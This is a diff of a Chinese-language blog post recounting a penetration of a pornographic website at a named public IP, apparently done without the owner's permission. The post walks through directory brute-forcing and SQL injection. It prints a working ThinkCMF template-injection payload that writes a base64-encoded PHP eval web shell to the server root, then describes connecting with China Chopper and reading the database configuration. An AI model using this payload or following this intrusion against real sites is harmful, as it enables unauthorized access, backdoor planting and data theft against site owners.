@@ -96,7 +96,7 @@
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/8.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/9.png">
 <meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/10.png">
-<meta property="og:updated_time" content="2019-11-06T08:16:23.895Z">
+<meta property="og:updated_time" content="2019-11-06T08:30:28.128Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="纪录对黄站的一次渗透测试">
 <meta name="twitter:description" content="该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。  简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注">
@@ -408,16 +408,16 @@
 <h3 id="对站点进行目录爆破"><a href="#对站点进行目录爆破" class="headerlink" title="对站点进行目录爆破"></a>对站点进行目录爆破</h3><p>这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。</p>
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/1.png" alt></p>
 <p>简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。</p>
-<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h3 id="注册用户进行渗透"><a href="#注册用户进行渗透" class="headerlink" title="注册用户进行渗透"></a>注册用户进行渗透</h3><p>注册用户，想看看用户是否有可上传文件的地方（比如上传头像），注册成功后发现并没有，个人信息处只有一个修改登录密码的功能。然后想着是否可以越权修改他人密码比如管理员的。抓包全面检查了一下参数，发现并没有明显的逻辑漏洞。<br>这里因为没有发现可利用的数据，所以就没有截图。</p>
+<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h3 id="注册用户进行渗透"><a href="#注册用户进行渗透" class="headerlink" title="注册用户进行渗透"></a>注册用户进行渗透</h3><p>注册用户，想看看用户是否有可上传文件的地方（比如上传头像），注册成功后发现并没有，个人信息处只有一个修改登录密码的功能。然后想着是否可以越权修改他人密码比如管理员的。抓包全面检查了一下参数，发现并没有明显的逻辑漏洞。<br>这里因为站长老哥把站给关了，操作过程中没有截图，所以就不放了。</p>
 <h3 id="对后台地址进行渗透"><a href="#对后台地址进行渗透" class="headerlink" title="对后台地址进行渗透"></a>对后台地址进行渗透</h3><p>发现前台登录没有明显的可利用漏洞，于是联想到之前爆目录爆出来的后台地址，精神又大振，尝试了一下admin登录，系统提示密码错误。神经瞬间亢奋，习惯性的进行了一波注入测试，发现并不存在。抓包看了一下响应包，发现不存在明显的逻辑特征。</p>
-<p>同样这里因为没有收获，就没有截图。</p>
+<p>这里因为站长老哥把站给关了，操作过程中没有截图，所以就不放了。</p>
 <h3 id="对主体内容进行渗透"><a href="#对主体内容进行渗透" class="headerlink" title="对主体内容进行渗透"></a>对主体内容进行渗透</h3><p>经过对流量的抓包和回放测试，发现了一个SQL注入漏洞，习惯性的丢到sqlmap里面去跑。</p>
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/2.png" alt></p>
-<p>但sqlmap似乎测试不出这是什么数据库，估计是过滤了一些关键字眼。本来是想着进行手注一下的，然后无意输入了一个错误路径，报错信息令我神经振奋。这是一个thinkcms的站，啥也不说payload走起。</p>
+<p>但sqlmap似乎测试不出这是什么数据库，估计是过滤了一些关键字眼。本来是想着手注一下的，然后无意输入了一个错误路径，报错信息令我神经振奋。这居然是一个thinkcms的站，啥也不说payload走起。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=<span class="string">''</span>&amp;content=&lt;php&gt;file_put_contents(<span class="string">'info.php'</span>,base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbJ2FiYyddKTs/Pg=='</span>))&lt;/php&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/3.png" alt></p>
-<p>这是直接上传到根目录，访问一波文件存在且解析成功，直接菜刀连接。</p>
+<p>这里shell文件是上传到根目录的，访问一波文件存在且解析成功，直接菜刀连接。</p>
 <p><img src="/2019/11/06/One-the-yellow-penetration-test/4.png" alt></p>
 <p>进行dos命令发现不成功，估计站点老哥做了一些安全限制。</p>
 <p>无奈只有去找其他的可用信息，查找了一下站点的配置信息，发现了数据库的配置信息。</p>
